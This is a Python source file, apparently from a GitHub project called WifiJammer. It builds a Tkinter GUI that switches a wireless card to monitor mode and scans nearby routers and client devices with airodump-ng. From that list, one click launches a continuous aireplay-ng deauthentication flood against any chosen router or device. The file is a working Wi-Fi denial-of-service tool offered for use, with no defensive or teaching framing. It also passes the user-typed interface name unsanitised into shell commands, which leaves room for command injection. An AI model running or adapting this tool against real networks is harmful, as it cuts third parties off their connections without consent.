#Source - https://github.com/PranavGajjar0305/WifiJammer
import os
import sys
import subprocess
import time
import threading
import random
import csv
from tkinter import *
from tkinter import ttk
import time

listall=[] #contain every data
listrc=[] #contain bssid and channel #router-channel
listrd=[] #contain bssid and ssid #router-device
listrdc=[] #contain bssid, ssid and channel #router-device-channel
listdeauth=[] #contain bssid, ssid and channel of deauth device
listprintbssid=[] #contain bssid
listprintdevices=[] #contain device's info
listdeauth=[] #contain deauth device's info
inti=0 #counter integer



root=Tk()
root.title("Welcome to WiFi-Jammer")
root.configure(background="White") 
root.configure(background="White") 



interface="wlan0"

def threadbssid(bssid,ch): #create separate thread for each router
	tind=threading.Thread(target=deauthfuncforbssid,args=(bssid,ch))
	tind.start()
	listdeauth.append(bssid)
				
def threaddevices(bssid,essid,ch): #create separete thread for each devices
	tind=threading.Thread(target=deauthfunc,args=(bssid,essid,ch))
	tind.start()
	listdeauth.append(essid)


def deauthfunc(bssid,essid,ch): #deauthanticate device
	global interface
	global listdeauth
	cmdall=["iwconfig",interface,"channel",ch]
	hometest=subprocess.run(cmdall)
	cmdall=["aireplay-ng","-0","0","-a",bssid,"-c",essid,interface]
	hometest=subprocess.run(cmdall)
	listdeauth.remove(essid)
	
def deauthfuncforbssid(bssid,ch): #deauthanticate router
	global interface
	global listdeauth
	cmdall=["iwconfig",interface,"channel",ch]
	hometest=subprocess.run(cmdall)
	cmdall=["aireplay-ng","-0","0","-a",bssid,interface]
	hometest=subprocess.run(cmdall)
	print(bssid)
	print(interface)
	print(ch)
	listdeauth.remove(bssid)


def diff_symmetric(list1,list2): #Symmetric Difference
	out=[]
	for ele in list1:
		if not ele in list2:
			out.append(ele)
	return out


def union(list1,list2): #Union
	out=[]
	for ele in list1:
		out.append(ele)
	for ele in list2:
		if not ele in out:
			out.append(ele)
	return out

def airodumpngall(interface): #Scan for near by 
	global listall
	global listrc
	global listrd
	global listrdc
	global listdeauth
	global filename
	i=random.random()
	filename=str(i)
	tin=threading.Thread(target=bar)
	tin.start()
	try:
		cmdall=["airodump-ng",interface,"-w",filename,"--write-interval","18","-o","csv"] #Scan for Near By devices
		subprocess.run(cmdall,timeout=23)
	except subprocess.TimeoutExpired:
		print("Complete of airodump-ng")	
		print("Fine")
		
	with open(filename+'-01.csv', 'r') as csvfile:
		spamreader = csv.reader(csvfile, delimiter=',')
		for row in spamreader:
			if(row!=[]):
				listall.append(row)
			
	for li in range(1,len(listall)): #adding router's bssid and channel
		if(listall[li][0]=="Station MAC"):
			break
		elif(listall[li][0]=="BSSID" or listall[li][0]=="d" or listall[li][0]=="a"):
			continue
		else:
			listintemp=[listall[li][0],listall[li][3].replace(" ",""),listall[li][13]]
			#print(listintemp)
			if(listintemp not in listrc):
				listrc.append([listall[li][0],listall[li][3].replace(" ",""),listall[li][13]])
			
	for li in range(1,len(listall)): #finding line no from where ssid start
		if(listall[li][0]=="Station MAC"):
			linenumofdevice=li+1
		
	for li in range(linenumofdevice,len(listall)): #adding router's bssid and device's ssid
		listindtemp=[listall[li][5].replace(" ",""),listall[li][0]]
		if(listindtemp not in listrd):
			listrd.append([listall[li][5].replace(" ",""),listall[li][0]])
			
	for li in range(0,len(listrd)): #adding router's bssid, ssid and channel
		if(listrd[li][0]!="(notassociated)"):
			tempinf=0
			for lj in range(0,len(listrc)):
				if(listrc[lj][0]==listrd[li][0]):
					tempinf=listrc[lj][1]
					break
			listinftemp=[listrd[li][0],listrd[li][1],tempinf]
			if(listinftemp not in listrdc):
				listrdc.append([listrd[li][0],listrd[li][1],tempinf])

	os.remove(filename+'-01.csv')	
	print(listrdc)
	print(listrc)
	listall=[]
	

def monitormode(): #Turning on monitor mode
    global interface
    global inti
    interface=e.get()  #this value you can use
    if inti==0:
    	subprocess.call("ifconfig "+interface+" down",shell=True)
    	subprocess.call("iwconfig "+interface+" mode monitor",shell=True)
    	subprocess.call("ifconfig "+interface+" up",shell=True)
    	
    t1=threading.Thread(target=airodumpngall,args=(interface,))
    t1.start()


def printtable(): #Print data in form of table
	global printlableint
	global listrc
	global listprintbssid
	global listprintdevices
	global listrdc
	global listdeauth
	listtempbssid=diff_symmetric(listrc,listprintbssid)
	listprintbssid=union(listrc,listprintbssid)
	
	column=0
	label=Label(f2,text="Near by Router's",bg="white",fg="black",padx=3,pady=3,highlightbackground="black",highlightthickness=2)
	label.grid(row=1,column=0,sticky="nsew",padx=1,pady=1)
	f2.grid_columnconfigure(column,weight=1)
	column=0
	label=Label(f2,text="Router's MACID",bg="white",fg="black",padx=3,pady=3,highlightbackground="black",highlightthickness=2)
	label.grid(row=2,column=0,sticky="nsew",padx=1,pady=1)
	f2.grid_columnconfigure(column,weight=1)
	column=1
	label=Label(f2,text="Channel No.",bg="white",fg="black",padx=3,pady=3,highlightbackground="black",highlightthickness=2)
	label.grid(row=2,column=1,sticky="nsew",padx=1,pady=1)
	f2.grid_columnconfigure(column,weight=1)
	column=2
	label=Label(f2,text="Router Name",bg="white",fg="black",padx=3,pady=3,highlightbackground="black",highlightthickness=2)
	label.grid(row=2,column=2,sticky="nsew",padx=1,pady=1)
	f2.grid_columnconfigure(column,weight=1)
	column=3
	label=Label(f2,text="Disonnect",bg="white",fg="black",padx=3,pady=3,highlightbackground="black",highlightthickness=2)
	label.grid(row=2,column=3,sticky="nsew",padx=1,pady=1)
	f2.grid_columnconfigure(column,weight=1)



	for row in range(3,len(listprintbssid)+3):
		column=0
		label=Label(f2,text=listprintbssid[row-3][0],bg="white",fg="black",padx=3,pady=3)
		label.grid(row=row,column=0,sticky="nsew",padx=1,pady=1)
		f2.grid_columnconfigure(column,weight=1)
		column=1
		label=Label(f2,text=listprintbssid[row-3][1],bg="white",fg="black",padx=3,pady=3)
		label.grid(row=row,column=1,sticky="nsew",padx=1,pady=1)
		f2.grid_columnconfigure(column,weight=1)
		column=2
		label=Label(f2,text=listprintbssid[row-3][2],bg="white",fg="black",padx=3,pady=3)
		label.grid(row=row,column=2,sticky="nsew",padx=1,pady=1)
		f2.grid_columnconfigure(column,weight=1)
		
		column=3
		
		if(listprintbssid[row-3][0] in listdeauth):	
			button=Button(f2,text="Disconnected",bg="red",fg="white",padx=3,pady=3)
			button.grid(row=row,column=3,sticky="nsew",padx=1,pady=1)
					
			button['command']=lambda arg1=listprintbssid[row-3][0],arg2=listprintbssid[row-3][1] : threadbssid(arg1,arg2)
			f2.grid_columnconfigure(column,weight=1)
		else:
			button=Button(f2,text="Connected",bg="green",fg="white",padx=3,pady=3)
			button.grid(row=row,column=3,sticky="nsew",padx=1,pady=1)
					
			button['command']=lambda arg1=listprintbssid[row-3][0],arg2=listprintbssid[row-3][1] : threadbssid(arg1,arg2)
			f2.grid_columnconfigure(column,weight=1)

	#for printing device's info
	templen=len(listprintbssid)+3
	listtempdevices=diff_symmetric(listrdc,listprintdevices)
	listprintdevices=union(listrdc,listprintdevices)

	column=0
	label=Label(f2,text="Near by Devices",bg="white",fg="black",padx=3,pady=3,highlightbackground="black",highlightthickness=2)
	label.grid(row=templen,column=0,sticky="nsew",padx=1,pady=1)
	f2.grid_columnconfigure(column,weight=1)
	column=1
	label=Label(f2,text="",bg="#63f2cf",fg="black",padx=3,pady=3)
	label.grid(row=templen,column=1,sticky="nsew",padx=1,pady=1)
	f2.grid_columnconfigure(column,weight=1)
	column=2	
	label=Label(f2,text="",bg="#63f2cf",fg="black",padx=3,pady=3)
	label.grid(row=templen,column=2,sticky="nsew",padx=1,pady=1)
	f2.grid_columnconfigure(column,weight=1)
	column=3	
	label=Label(f2,text="",bg="#63f2cf",fg="black",padx=3,pady=3)
	label.grid(row=templen,column=3,sticky="nsew",padx=1,pady=1)
	f2.grid_columnconfigure(column,weight=1)

	templen=templen+1

	column=0
	label=Label(f2,text="Router's MACID",bg="white",fg="black",padx=3,pady=3,highlightbackground="black",highlightthickness=2)
	label.grid(row=templen,column=0,sticky="nsew",padx=1,pady=1)
	f2.grid_columnconfigure(column,weight=1)
	column=1
	label=Label(f2,text="Device's MACID.",bg="white",fg="black",padx=3,pady=3,highlightbackground="black",highlightthickness=2)
	label.grid(row=templen,column=1,sticky="nsew",padx=1,pady=1)
	f2.grid_columnconfigure(column,weight=1)
	column=2
	label=Label(f2,text="Channel No.",bg="white",fg="black",padx=3,pady=3,highlightbackground="black",highlightthickness=2)
	label.grid(row=templen,column=2,sticky="nsew",padx=1,pady=1)
	f2.grid_columnconfigure(column,weight=1)
	column=3
	label=Label(f2,text="Disconnect",bg="white",fg="black",padx=3,pady=3,highlightbackground="black",highlightthickness=2)
	label.grid(row=templen,column=3,sticky="nsew",padx=1,pady=1)
	f2.grid_columnconfigure(column,weight=1)
	
	for row in range(templen+1,len(listprintdevices)+templen+1):
		column=0
		label=Label(f2,text=listprintdevices[row-templen-1][0],bg="white",fg="black",padx=3,pady=3)
		label.grid(row=row,column=0,sticky="nsew",padx=1,pady=1)
		f2.grid_columnconfigure(column,weight=1)
		column=1
		label=Label(f2,text=listprintdevices[row-templen-1][1],bg="white",fg="black",padx=3,pady=3)
		label.grid(row=row,column=1,sticky="nsew",padx=1,pady=1)
		f2.grid_columnconfigure(column,weight=1)
		column=2
		label=Label(f2,text=listprintdevices[row-templen-1][2],bg="white",fg="black",padx=3,pady=3)
		label.grid(row=row,column=2,sticky="nsew",padx=1,pady=1)
		f2.grid_columnconfigure(column,weight=1)
		
		if(listprintdevices[row-templen-1][1] in listdeauth):
		
			column=3
			button=Button(f2,text="Disconnected",bg="red",fg="white",padx=3,pady=3)
			button.grid(row=row,column=3,sticky="nsew",padx=1,pady=1)
					
			button['command']=lambda arg1=listprintdevices[row-templen-1][0],arg2=listprintdevices[row-templen-1][1],arg3=listprintdevices[row-templen-1][2] : threaddevices(arg1,arg2,arg3)
			f2.grid_columnconfigure(column,weight=1)
		else:
			column=3
			button=Button(f2,text="Connected",bg="green",fg="white",padx=3,pady=3)
			button.grid(row=row,column=3,sticky="nsew",padx=1,pady=1)
					
			button['command']=lambda arg1=listprintdevices[row-templen-1][0],arg2=listprintdevices[row-templen-1][1],arg3=listprintdevices[row-templen-1][2] : threaddevices(arg1,arg2,arg3)
			f2.grid_columnconfigure(column,weight=1)

		
	root.after(10000,printtable) #Refresh screen after 10 second


lbl = Label(root, text="WiFi Jammer", font=("Arial Bold", 50 ), highlightcolor="red",bg="black",fg="white")
lbl.pack(fill=X) #Title Label

f1=Frame(root,background="blue",height=30)
f1.pack(side=TOP,fill=X) #Frame 1

f2=Frame(root,background="#63f2cf",height=400)
f2.pack(side=BOTTOM,fill=BOTH,expand=YES) #Frame 2

intf=Label(f1, text="Enter Interface name" ) #Interface name
intf.pack(side=LEFT,expand=YES) 

equation = StringVar()
e = Entry(f1, textvariable=equation, bg='White') 
equation.set('wlan0')
e.pack(side=LEFT,expand=YES)

b1=Button(f1,text="Start Scan",bg='red', fg='white', command=monitormode) #Button for start scanning
b1.pack()


progress=ttk.Progressbar(f1,orient=HORIZONTAL,len=200,mode='determinate') #ProgrssBar
progress.pack()

def bar(): #Function for ProgressBar
	i=23/100
	for x in range(1,101):
		progress['value']=x
		time.sleep(i)

printtable() #Calling printtable function
root.geometry('800x800') #this is for window size
root.mainloop()
